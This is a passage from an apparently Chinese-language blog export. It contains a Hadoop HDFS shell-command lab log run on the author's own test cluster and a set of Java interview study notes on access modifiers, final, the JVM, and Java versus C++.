&lt;acl_spec&gt; &lt;path&gt;]]</span><br><span class="line">	[-setfattr &#123;-n name [-v value] | -x name&#125; &lt;path&gt;]</span><br><span class="line">	[-setrep [-R] [-w] &lt;rep&gt; &lt;path&gt; ...]</span><br><span class="line">	[-stat [format] &lt;path&gt; ...]</span><br><span class="line">	[-tail [-f] [-s &lt;sleep interval&gt;] &lt;file&gt;]</span><br><span class="line">	[-test -[defsz] &lt;path&gt;]</span><br><span class="line">	[-text [-ignoreCrc] &lt;src&gt; ...]</span><br><span class="line">	[-touch [-a] [-m] [-t TIMESTAMP ] [-c] &lt;path&gt; ...]</span><br><span class="line">	[-touchz &lt;path&gt; ...]</span><br><span class="line">	[-truncate [-w] &lt;length&gt; &lt;path&gt; ...]</span><br><span class="line">	[-usage [cmd ...]]</span><br><span class="line"></span><br><span class="line">Generic options supported are:</span><br><span class="line">-conf &lt;configuration file&gt;        specify an application configuration file</span><br><span class="line">-D &lt;property=value&gt;               define a value for a given property</span><br><span class="line">-fs &lt;file:///|hdfs://namenode:port&gt; specify default filesystem URL to use, overrides &#x27;fs.defaultFS&#x27; property from configurations.</span><br><span class="line">-jt &lt;local|resourcemanager:port&gt;  specify a ResourceManager</span><br><span class="line">-files &lt;file1,...&gt;                specify a comma-separated list of files to be copied to the map reduce cluster</span><br><span class="line">-libjars &lt;jar1,...&gt;               specify a comma-separated list of jar files to be included in the classpath</span><br><span class="line">-archives &lt;archive1,...&gt;          specify a comma-separated list of archives to be unarchived on the compute machines</span><br><span class="line"></span><br><span class="line">The general command line syntax is:</span><br><span class="line">command [genericOptions] [commandOptions]</span><br></pre></td></tr></table></figure>

<h3 id="常见操作"><a href="#常见操作" class="headerlink" title="常见操作"></a>常见操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="built_in">help</span> 输出这个命令的参数</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -help rm</span><br><span class="line">-rm [-f] [-r|-R] [-skipTrash] [-safely] &lt;src&gt; ... :</span><br><span class="line">  Delete all files that match the specified file pattern. Equivalent to the Unix</span><br><span class="line">  command &quot;rm &lt;src&gt;&quot;</span><br><span class="line">                                                                                 </span><br><span class="line">  -f          If the file does not exist, do not display a diagnostic message or </span><br><span class="line">              modify the exit status to reflect an error.                        </span><br><span class="line">  -[rR]       Recursively deletes directories.                                   </span><br><span class="line">  -skipTrash  option bypasses trash, if enabled, and immediately deletes &lt;src&gt;.  </span><br><span class="line">  -safely     option requires safety confirmation, if enabled, requires          </span><br><span class="line">              confirmation before deleting large directory with more than        </span><br><span class="line">              &lt;hadoop.shell.delete.limit.num.files&gt; files. Delay is expected when</span><br><span class="line">              walking over large directory recursively to count the number of    </span><br><span class="line">              files to be deleted before the confirmation. </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="built_in">mkdir</span> 新建文件夹</span></span><br><span class="line">[huang@hadoop102 ~]$ hadoop fs -mkdir /sanguo</span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ vi shuguo.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-moveFromLocal 从本地剪切粘贴到HDFS</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -moveFromLocal ./shuguo.txt /sanguo</span><br><span class="line">2021-06-30 13:55:50,370 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">总用量 212</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 bin</span><br><span class="line">drwxrwxr-x. 4 huang huang   4096 6月  28 11:54 data</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9月   4 2019 LICENSE.txt</span><br><span class="line">drwxrwxr-x. 3 huang huang   4096 6月  29 20:38 logs</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9月   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9月   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 share</span><br><span class="line">drwxrwxr-x. 2 huang huang   4096 6月  28 12:13 wcinput</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ vi weiguo.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-copyFromLocal 从本地文件系统拷贝到HDFS路径去</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -copyFromLocal ./weiguo.txt /sanguo</span><br><span class="line">2021-06-30 13:57:22,614 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">总用量 216</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 bin</span><br><span class="line">drwxrwxr-x. 4 huang huang   4096 6月  28 11:54 data</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9月   4 2019 LICENSE.txt</span><br><span class="line">drwxrwxr-x. 3 huang huang   4096 6月  29 20:38 logs</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9月   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9月   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 share</span><br><span class="line">drwxrwxr-x. 2 huang huang   4096 6月  28 12:13 wcinput</span><br><span class="line">-rw-rw-r--. 1 huang huang      7 6月  30 13:56 weiguo.txt</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ vi wuguo.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-put 等同于copyFromLocal，生产环境更习惯用put</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -put ./wuguo.txt /sanguo</span><br><span class="line">2021-06-30 13:58:16,277 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ vi liubei.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-appendFile 追加一个文件到已经存在的文件末尾</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -appendToFile ./liubei.txt /sanguo/shuguo.txt</span><br><span class="line">2021-06-30 14:00:23,765 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-copyToLocal 从HDFS拷贝到本地</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -copyToLocal /sanguo/shuguo.txt ./</span><br><span class="line">2021-06-30 14:01:16,117 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">总用量 228</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 bin</span><br><span class="line">drwxrwxr-x. 4 huang huang   4096 6月  28 11:54 data</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9月   4 2019 LICENSE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang      7 6月  30 13:59 liubei.txt</span><br><span class="line">drwxrwxr-x. 3 huang huang   4096 6月  29 20:38 logs</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9月   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9月   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 share</span><br><span class="line">-rw-r--r--. 1 huang huang     14 6月  30 14:01 shuguo.txt</span><br><span class="line">drwxrwxr-x. 2 huang huang   4096 6月  28 12:13 wcinput</span><br><span class="line">-rw-rw-r--. 1 huang huang      7 6月  30 13:56 weiguo.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang      6 6月  30 13:58 wuguo.txt</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ vi shuguo.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-get 等同于copyToLocal，生产环境更喜欢用get</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -get /sanguo/shuguo.txt ./shuguo2.txt </span><br><span class="line">2021-06-30 14:05:26,350 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">总用量 232</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 bin</span><br><span class="line">drwxrwxr-x. 4 huang huang   4096 6月  28 11:54 data</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9月   4 2019 LICENSE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang      7 6月  30 13:59 liubei.txt</span><br><span class="line">drwxrwxr-x. 3 huang huang   4096 6月  29 20:38 logs</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9月   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9月   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 share</span><br><span class="line">-rw-r--r--. 1 huang huang     14 6月  30 14:05 shuguo2.txt</span><br><span class="line">-rw-r--r--. 1 huang huang     14 6月  30 14:01 shuguo.txt</span><br><span class="line">drwxrwxr-x. 2 huang huang   4096 6月  28 12:13 wcinput</span><br><span class="line">-rw-rw-r--. 1 huang huang      7 6月  30 13:56 weiguo.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang      6 6月  30 13:58 wuguo.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="built_in">ls</span> 显示目录信息</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -ls /sanguo</span><br><span class="line">Found 3 items</span><br><span class="line">-rw-r--r--   3 huang supergroup         14 2021-06-30 14:00 /sanguo/shuguo.txt</span><br><span class="line">-rw-r--r--   3 huang supergroup          7 2021-06-30 13:57 /sanguo/weiguo.txt</span><br><span class="line">-rw-r--r--   3 huang supergroup          6 2021-06-30 13:58 /sanguo/wuguo.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="built_in">cat</span> 显示文件内容</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -cat /sanguo/wuguo.txt</span><br><span class="line">2021-06-30 14:06:27,858 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">wuguo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="built_in">chgrp</span>，-<span class="built_in">chmod</span>，-<span class="built_in">chown</span>：linux文件系统中的用法一样，修改文件所属权限</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -chmod 666 /sanguo/shuguo.txt</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -chown huang:huang /sanguo/shuguo.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="built_in">mkdir</span> 创建路径</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -mkdir /jinguo</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="built_in">cp</span> 从HDFS的一个路径拷贝到HDFS的另一个路径</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -cp /sanguo/shuguo.txt /jinguo</span><br><span class="line">2021-06-30 14:09:11,407 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">2021-06-30 14:09:11,512 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="built_in">mv</span> 在HDFS目录中移动文件</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -mv /sanguo/wuguo.txt /jinguo</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -mv /sanguo/weiguo.txt /jinguo</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="built_in">tail</span> 显示一个文件的末尾1kb的数据</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -tail /jinguo/shuguo.txt</span><br><span class="line">2021-06-30 14:11:43,198 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">shuguo</span><br><span class="line">liubei</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="built_in">rm</span> 删除文件或文件夹</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -rm /sanguo/shuguo.txt</span><br><span class="line">Deleted /sanguo/shuguo.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="built_in">rm</span> -r 递归删除目录及目录里面内容</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -rm -r /sanguo</span><br><span class="line">Deleted /sanguo</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="built_in">du</span> 统计文件夹的大小信息</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -du -s -h /jinguo</span><br><span class="line">27  81  /jinguo</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -du -h /jinguo</span><br><span class="line">14  42  /jinguo/shuguo.txt</span><br><span class="line">7   21  /jinguo/weiguo.txt</span><br><span class="line">6   18  /jinguo/wuguo.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-setrep 设置HDFS中文件的副本数量</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里得看DataNode的数量，因为目前只有3台设备，最多就3个副本，只有节点数增加到10副本数才能达到10</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -setrep 10 /jinguo/shuguo.txt</span><br><span class="line">Replication 10 set: /jinguo/shuguo.txt</span><br></pre></td></tr></table></figure>

<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><p>通过web端可以查看到创建的文件夹：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220106739.png" alt="image-20210630143235900"></p>
<p>这个也可以shuguo.txt的副本数为10:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220106740.png" alt="image-20210630143324158"></p>
<p>文件信息：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220106741.png" alt="image-20210630143802614"></p>
<h2 id="四、实验遇到的问题及解决方法"><a href="#四、实验遇到的问题及解决方法" class="headerlink" title="四、实验遇到的问题及解决方法"></a>四、实验遇到的问题及解决方法</h2><h3 id="Hadoop102-9870-访问不了"><a href="#Hadoop102-9870-访问不了" class="headerlink" title="Hadoop102:9870 访问不了"></a>Hadoop102:9870 访问不了</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220106742.png" alt="image-20210630144104874"></p>
<p>反复排查后，发现主机mac上的hosts设置错了，倒是hadoop102对应的ip找不到。</p>
<p>解决方案：</p>
<p>重新设置hosts即可</p>
]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Java</title>
    <url>/2021/12/21/Java/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><p>面向对象</p>
<p>private</p>
<p>类加载</p>
<p>双亲委派</p>
<p>垃圾回收算法</p>
<p>G1</p>
<p>ZGC</p>
<p>AQS 锁</p>
<p>设计cas</p>
<p>synchronized</p>
<p>内存屏障 写屏障</p>
<p>线程池</p>
<p>mysql</p>
<p>索引</p>
<p>hashmap</p>
<p>怎么判断链表环</p>
<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="内部类的优点和缺点"><a href="#内部类的优点和缺点" class="headerlink" title="内部类的优点和缺点"></a>内部类的优点和缺点</h3><p>可以被private和protected修饰。</p>
<ul>
<li>优点：内部类可以随意使用外部类的成员变量（包括私有）而不用生成外部类的对象，这也是内部类的唯一优点。</li>
<li>缺点：破坏了原有类的程序结构。</li>
</ul>
<h3 id="switch-是否能作用在-byte，long，String"><a href="#switch-是否能作用在-byte，long，String" class="headerlink" title="switch 是否能作用在 byte，long，String"></a>switch 是否能作用在 byte，long，String</h3><p>Java 5 以前，switch(expr)中，expr 只能是 byte、short、char、int。</p>
<p>从  Java5 开始，expr 可以是 enum 类型。</p>
<p>从 Java 7  开始，expr 还可以是字符串（String）。</p>
<p>长整型（long）在目前所有的版本中都是不可以的。</p>
<h3 id="Java语言采用何种编码方案"><a href="#Java语言采用何种编码方案" class="headerlink" title="Java语言采用何种编码方案"></a>Java语言采用何种编码方案</h3><p>Unicode（标准码）： 它为每个字符制订了一个唯一的数值，因此在任何的语言，平台，程序都可以运行。</p>
<h4 id="在-Java-中，如何跳出当前的多重嵌套循环"><a href="#在-Java-中，如何跳出当前的多重嵌套循环" class="headerlink" title="在 Java 中，如何跳出当前的多重嵌套循环"></a>在 Java 中，如何跳出当前的多重嵌套循环</h4><p>在Java中，要想跳出多重循环，可以在外面的循环语句前定义一个标号，然后在里层循环体的代码中使用带有标号的break 语句，即可跳出外层循环。</p>
<h3 id="用最有效率的方法计算-2的3次方"><a href="#用最有效率的方法计算-2的3次方" class="headerlink" title="用最有效率的方法计算 2的3次方"></a>用最有效率的方法计算 2的3次方</h3><p>2 &lt;&lt; 3</p>
<h3 id="float-f-x3D-3-4"><a href="#float-f-x3D-3-4" class="headerlink" title="float f&#x3D;3.4"></a>float f&#x3D;3.4</h3><p>应该写成float f &#x3D;(float)3.4或 float f &#x3D;3.4F。</p>
<h3 id="short-s1-x3D-1-s1-x3D-s1-1-和-short-s1-x3D-1-s1-x3D-1"><a href="#short-s1-x3D-1-s1-x3D-s1-1-和-short-s1-x3D-1-s1-x3D-1" class="headerlink" title="short s1 &#x3D; 1; s1 &#x3D; s1 + 1; 和 short s1 &#x3D; 1; s1 +&#x3D; 1;"></a>short s1 &#x3D; 1; s1 &#x3D; s1 + 1; 和 short s1 &#x3D; 1; s1 +&#x3D; 1;</h3><p>1 是 int 类型，因此 s1+1 运算结果也是 int型，需要强制类型转换。</p>
<p>s1+&#x3D; 1相当于 s1 &#x3D; (short(s1 + 1)，其中有隐含的强制类型转换。</p>
<h3 id="private，default，protected，public"><a href="#private，default，protected，public" class="headerlink" title="private，default，protected，public"></a>private，default，protected，public</h3><p>private：当前类。使用对象：变量、方法。<br>default：同包。使用对象：类、接口、变量、方法。<br>protected：同包，子类。使用对象：变量、方法<br>public： 同包，子类，其他包。使用对象：类、接口、变量、方法。</p>
<p> 注意：</p>
<p>private和protected不能修饰类（外部类）。外部类就是模版，使用private和protected修饰就没有任何意义。 private和protected不能修饰接口，只能public（default可以写出来，但是编译之后自动转为了public），</p>
<h4 id="为什么类和接口（不考虑内部类和接口）不能使用private和protected修饰词，只能是public和default？"><a href="#为什么类和接口（不考虑内部类和接口）不能使用private和protected修饰词，只能是public和default？" class="headerlink" title="为什么类和接口（不考虑内部类和接口）不能使用private和protected修饰词，只能是public和default？"></a>为什么类和接口（不考虑内部类和接口）不能使用private和protected修饰词，只能是public和default？</h4><p>private：</p>
<p>很好理解，类和接口如果定义成private，那么其他任何类都不能访问，这样的类写出来也没有意义。</p>
<p>protected：</p>
<p>这个问题用反证法比较好解释清楚，假设类B和A不在同一个包，A又是protected类， 那么B能访问A的前提是B是A的子类，而B能成为A的子类（或者说B能继承A）的前提又是B能访问A。这两个条件互为前提，无法实现。</p>
<h4 id="为什么接口的方法不能是private和protected，只能public（default可以写出来，但是编译之后自动转为了public）？"><a href="#为什么接口的方法不能是private和protected，只能public（default可以写出来，但是编译之后自动转为了public）？" class="headerlink" title="为什么接口的方法不能是private和protected，只能public（default可以写出来，但是编译之后自动转为了public）？"></a>为什么接口的方法不能是private和<a href="https://so.csdn.net/so/search?q=protected&spm=1001.2101.3001.7020">protected</a>，只能public（default可以写出来，但是编译之后自动转为了public）？</h4><p>private：</p>
<p>接口是需要其他类实现的，如果方法定义成private，那么其他任何类都不能访问。这样的方法即要求被实现，又对任何类不可见，这是无法实现的。</p>
<p>protected：</p>
<p>（1）假设public接口I有一个protected方法M，那么位于其他包的public类C就可以实现这个接口（方法M依然是protected）。那么C的同包类D调用方法M只能这样访问：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">C</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C</span>();</span><br><span class="line">c.M();</span><br><span class="line"><span class="comment">//无法这样访问：</span></span><br><span class="line"><span class="type">I</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C</span>();</span><br><span class="line">c.M();</span><br></pre></td></tr></table></figure>

<p>这样就失去了使用接口的重要意义：提供统一的接口，面向接口编程思想也无法体现。</p>
<p>（2）假设接口I是default的，那么方法M是protected理论上是没有问题的，而且M也可以是default、public。至于为什么不让用protected，可能是出于简化修饰词的复杂度的目的（如果使用，需要区分接口是public的时候不能用，default接口则能用），至于default请参考（3）。</p>
<p>default:</p>
<p>（3）假设public接口I有一个default方法M， 那么位于其他包的无法正常实现接口I，因为方法M对其不可见。</p>
<p>（4）假设default接口I有一个default方法M，那么方法M是default理论上是没有问题的，而且M也可以是proteced、public。可能出于和（2）所说不能用protected的相同原因，不能使用default。</p>
<p>因此，综合以上四点，接口方法只能使用public，既然只能用public，java编译器在你忘了在M前写public的时候干脆自动帮你转成public了。</p>
<h3 id="3-0-1-x3D-x3D-0-3返回值是什么"><a href="#3-0-1-x3D-x3D-0-3返回值是什么" class="headerlink" title="3*0.1&#x3D;&#x3D;0.3返回值是什么"></a><strong>3*0.1&#x3D;&#x3D;0.3返回值是什么</strong></h3><p>false，因为有些浮点数不能完全精确的表示出来。</p>
<h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><ul>
<li><p>被final修饰的方法，JVM会尝试将其内联，以提高运行效率。</p>
</li>
<li><p>被final修饰的常量，在编译阶段会存入常量池中。</p>
</li>
<li><p>被final修饰的类不可以被继承。</p>
</li>
<li><p>被final修饰的方法不可以被重写。</p>
</li>
<li><p>被final修饰的变量不可以被改变。被final修饰不可变的是变量的引用，而不是引用指向的内容;</p>
</li>
<li><p>final不可变性的保证是靠编译器来保证的。</p>
</li>
</ul>
<h3 id="java语言特点"><a href="#java语言特点" class="headerlink" title="java语言特点"></a>java语言特点</h3><ul>
<li><p>简单易学。</p>
</li>
<li><p>面向对象。</p>
</li>
<li><p>跨平台。</p>
</li>
<li><p>支持多线程。</p>
</li>
<li><p>支持网络编程而且很方便（Java 语言诞生本身就是为简化网络编程设计的，因此 Java 语言不仅支持网络编程而且很方便）。</p>
</li>
<li><p>编译和解释并存。</p>
</li>
</ul>
<h3 id="JVM-JDK-JRE"><a href="#JVM-JDK-JRE" class="headerlink" title="JVM JDK JRE"></a>JVM JDK JRE</h3><p>JVM：运行java字节码的虚拟机。有针对不同系统的特定实现，使用相同的字节码，在不同系统下运行都会有相同的结果。</p>
<blockquote>
<p> class文件到机器码：在这一步 JVM类加载器首先加载字节码文件，然后通过解释器逐行解释执行，这种方式的执行速度会相对比较慢。而且，有些方法和代码块是经常需要被调用的（也就是所谓的热点代码），所以后面引进了 JIT（just-in-time）编译器，而 JIT 属于运行时编译。当 JIT 编译器完成第一次编译后，其会将字节码对应的机器码保存下来，下次可以直接使用。机器码的运行效率肯定是高于 Java 解释器的。这也解释了为什么经常会说 Java 是编译与解释共存的语言。</p>
</blockquote>
<blockquote>
<p>HotSpot 采用了惰性评估（Lazy Evaluation）的做法，根据二八定律，消耗大部分系统资源的只有那一小部分的代码（热点代码），而这也就是 JIT 所需要编译的部分。JVM 会根据代码每次被执行的情况收集信息并相应地做出一些优化，因此执行的次数越多，它的速度就越快。JDK 9 引入了一种新的编译模式 AOT（Ahead of Time Compilation），它是直接将class文件编译成机器码，这样就避免了 JIT 预热等各方面的开销。JDK 支持分层编译和 AOT 协作使用。但是 ，AOT 编译器的编译质量是肯定比不上 JIT 编译器的。</p>
</blockquote>
<p>JDK：java development kit </p>
<p>JRE： java runtime environment</p>
<p>有时，即使不打算在计算机上进行任何 Java 开发，仍然需要安装 JDK。例如，如果要使用 JSP 部署 Web 应用程序，那么从技术上讲，只是在应用程序服务器中运行 Java 程序。但是应用程序服务器会将 JSP 转换为 Java servlet，并且需要使用 JDK 来编译 servlet。</p>
<h3 id="Oracle-JDK-和-Open-JDK的对比"><a href="#Oracle-JDK-和-Open-JDK的对比" class="headerlink" title="Oracle JDK 和 Open JDK的对比"></a>Oracle JDK 和 Open JDK的对比</h3><ul>
<li><p>OpenJDK 是一个参考模型并且是完全开源的，而 Oracle JDK 是 OpenJDK 的一个实现，并不是完全开源的；</p>
</li>
<li><p>Oracle JDK 比 OpenJDK 更稳定。OpenJDK 和 Oracle JDK 的代码几乎相同，但 Oracle JDK 有更多的类和一些错误修复。因此，如果想开发企业&#x2F;商业软件，建议选择 Oracle JDK，因为它经过了彻底的测试和稳定。某些情况下，有些人提到在使用 OpenJDK 可能会遇到了许多应用程序崩溃的问题，但是，只需切换到 Oracle JDK 就可以解决问题；</p>
</li>
<li><p>在响应性和 JVM 性能方面，Oracle JDK 与 OpenJDK 相比提供了更好的性能；</p>
</li>
<li><p>Oracle JDK 不会为即将发布的版本提供长期支持，用户每次都必须通过更新到最新版本获得支持来获取最新版本；</p>
</li>
<li><p>Oracle JDK 根据二进制代码许可协议获得许可，而 OpenJDK 根据 GPL v2 许可获得许可。</p>
</li>
</ul>
<h3 id="Java和C-的区别"><a href="#Java和C-的区别" class="headerlink" title="Java和C++的区别"></a>Java和C++的区别</h3><ul>
<li><p>都是面向对象的语言，都支持封装，继承，多态；</p>
</li>
<li><p>Java不提供指针直接访问内存，程序更加安全；</p>
</li>
<li><p>Java的类是单继承的，C++支持多继承，但Java接口可以多继承（为了弥补不支持多继承的缺点）；</p>
</li>
<li><p>Java有GC，不需要程序员手动释放无用内存。</p>
</li>
<li><p>在 C 语言中，字符串或字符数组最后都会有一个额外的字符’\0’来表示结束。但是，Java 语言中没有结束符这一概念。</p>
</li>
</ul>
<blockquote>
<p><a href="https://blog.csdn.net/sszgg2006/article/details/49148189">https://blog.csdn.net/sszgg2006/article/details/49148189</a></p>
<p>Java里面一切都是对象，是对象的话，字符串肯定就有长度，即然有长度，编译器就可以确定要输出的字符个数，也就没有必要浪费那1字节的空间用以标明字符串的结束了。比如，数组对象里有一个属性length，就是数组的长度，String类里面有方法length()可以确定字符串的长度，因此对于输出函数来说，有直接的大小可以判断字符串的边界，编译器就没必要再去浪费一个空间标识字符串的结束。<br>Java和C通信的时候，由于C中的char中有结束符的，所以当Java收到C发来的字符串时，后面往往会有若干空字符，如果不做处理的话，Java会对其一并输出，为了将空字符处理掉不输出，可以采用如下两种方法：</p>
<p>方法一:</p>
<p>调用Java字符串的trim()方法，该方法会将字符串前后的空字符都去掉。</p>
<p>方法二：</p>
<p>自己实现去掉尾部空字符的方法。</p>
</blockquote>
